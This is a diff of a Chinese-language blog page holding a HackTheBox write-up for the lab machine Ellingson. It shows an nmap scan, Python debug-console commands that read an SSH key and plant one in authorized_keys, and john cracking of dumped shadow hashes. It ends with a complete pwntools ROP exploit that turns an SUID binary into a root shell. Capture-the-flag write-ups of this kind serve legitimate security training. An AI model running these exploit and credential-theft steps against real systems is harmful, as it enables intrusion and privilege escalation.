@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;189  10.10.10.139   端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.139Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2021-09-08 14:2">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;189  10.10.10.139                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Ellingson - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/09/08/Ellingson-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;189  10.10.10.139   端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.139Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2021-09-08 14:2">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;189  10.10.10.139                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090803.jpg">
@@ -128,7 +128,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -218,37 +218,109 @@
 </li>
 <li><h2 id="10-10-10-139"><a href="#10-10-10-139" class="headerlink" title="10.10.10.139"></a>10.10.10.139</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090801.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.139</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-08 14:22 CST</span><br><span class="line">Nmap scan report for 10.10.10.139</span><br><span class="line">Host is up (0.070s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)</span><br><span class="line">|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)</span><br><span class="line">|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">| http-title: Ellingson Mineral Corp</span><br><span class="line">|_Requested resource was http://10.10.10.139/index</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 61.28 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>页面一些新闻，可以作为参考提示信息：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>任意一个页面构造报错，可以发现python debug：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090803.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><p>可以通过debug执行python代码，不能直接shell，可以查看文件之类的,读取私钥是加密的，但可以写公钥进去后ssh连接：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.listdir(<span class="string">'/home'</span>)</span><br><span class="line">os.listdir(<span class="string">'/home/hal/'</span>)</span><br><span class="line">os.listdir(<span class="string">'/home/hal/.ssh'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/home/hal/.ssh/id_rsa'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f: f.read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/home/hal/.ssh/authorized_keys'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f: f.write(<span class="string">'\nssh-rsa xxxxxx'</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090804.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090805.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>hal用户在adm组中，可以查看日志之类的(官方的和ippsec的都是adm可以查看backup,可能机器设置问题，0xdf博客说重置后会变成易受攻击状态，因为定时任务设置的是每天一次backup)：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090806.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据提示生成小字典，破解出来margo用户密码,直接rockyou硬跑也行：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep -i -e love -e secret -e sex -e god /usr/share/wordlists/rockyou.txt &gt; grepped_rockyou </span><br><span class="line"></span><br><span class="line">sudo john --wordlist=grepped_rockyou hash.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$Lv8rcvK8</span><span class="variable">$la</span>/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:iamgod<span class="variable">$08</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090809.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="shadow-bak"><a href="#shadow-bak" class="headerlink" title="shadow.bak"></a>shadow.bak</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj&#x2F;aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot&#x2F;:17964:0:99999:7:::</span><br><span class="line">hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0&#x2F;i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::</span><br><span class="line">margo:$6$Lv8rcvK8$la&#x2F;ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G&#x2F;kbd72poeAnyJL4c1:17964:0:99999:7:::</span><br><span class="line">duke:$6$bFjry0BT$OtPFpMfL&#x2F;KuUZOafZalqHINNX&#x2F;acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc&#x2F;:17964:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>margo用户登录，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090807.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>suid发现一个garbage：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090808.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="garbage-amp-root-flag"><a href="#garbage-amp-root-flag" class="headerlink" title="garbage &amp; root flag"></a>garbage &amp; root flag</h1><p>有ASLR,NX的rop,puts泄漏函数地址，计算base，之后rop,直接打会放弃suid，还需要加入setuid,参考资料里0xdf的很详细</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rip offset 136</span><br><span class="line"></span><br><span class="line">rop-tool gadget garbage | grep rdi</span><br><span class="line">0x000000000040179b -&gt; pop rdi; ret ;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090810.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021090810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "DEBUG"</span></span><br><span class="line">sshConn = ssh(host=<span class="string">'10.10.10.139'</span>, user=<span class="string">'margo'</span>, password=<span class="string">'iamgod$08'</span>)</span><br><span class="line">garbage = sshConn.process(<span class="string">'garbage'</span>)</span><br><span class="line"></span><br><span class="line">junk     = <span class="string">"A"</span> * <span class="number">136</span>      <span class="comment"># offset from pattern</span></span><br><span class="line">pop_rdi  = p64(<span class="number">0x40179b</span>)  <span class="comment"># rop-tool gadget garbage | grep rdi</span></span><br><span class="line">puts_plt = p64(<span class="number">0x401050</span>)  <span class="comment"># objdump -D garbage | grep puts@GLIBC</span></span><br><span class="line">puts_got = p64(<span class="number">0x404028</span>)  <span class="comment"># objdump -D garbage | grep puts@GLIBC</span></span><br><span class="line">main     = p64(<span class="number">0x401619</span>)  <span class="comment"># objdump -D garbage | grep '&lt;main&gt;' </span></span><br><span class="line"></span><br><span class="line">stage_1 = junk + pop_rdi + puts_got + puts_plt + main</span><br><span class="line">garbage.sendline(stage_1)</span><br><span class="line">garbage.recvuntil(<span class="string">"access denied.\n"</span>)</span><br><span class="line">leaked_puts = u64(garbage.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"Leaked puts address: 0x%x"</span> % leaked_puts)</span><br><span class="line">garbage.recvuntil(<span class="string">"Enter access password: "</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># offsets</span></span><br><span class="line">libc_puts    = <span class="number">0x809c0</span>  <span class="comment"># readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@GLIBC"</span></span><br><span class="line">libc_exec_sh = <span class="number">0x4f322</span>  <span class="comment"># one_gadget gadget garbage</span></span><br><span class="line">libc_setuid  = <span class="number">0xe5970</span>  <span class="comment"># readelf -s libs/libc6_2.27-3ubuntu1_amd64/libc.so.6 | grep " setuid@@GLIBC"</span></span><br><span class="line">libc_base   = leaked_puts - libc_puts</span><br><span class="line"></span><br><span class="line">stage_2 = junk + pop_rdi + p64(<span class="number">0</span>) + p64(libc_setuid + libc_base) + p64(libc_exec_sh + libc_base)</span><br><span class="line">garbage.sendline(stage_2)</span><br><span class="line">garbage.recvuntil(<span class="string">"access denied."</span>)</span><br><span class="line">garbage.interactive()</span><br></pre></td></tr></table></figure>
 
 
